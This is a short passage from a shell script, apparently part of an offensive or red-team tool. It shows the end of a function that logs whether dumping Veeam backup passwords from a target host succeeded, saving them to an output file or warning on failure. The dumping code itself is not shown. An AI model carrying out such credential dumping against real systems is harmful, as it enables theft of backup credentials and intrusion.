    add_log "Veeam credentials saved to $output_file"
  else
    log_operation "Veeam_Credentials" "failed" "\"error\": \"Failed to dump Veeam passwords\""
    add_warning "Failed to dump Veeam passwords on target $TARGET_HOST"
  fi
}

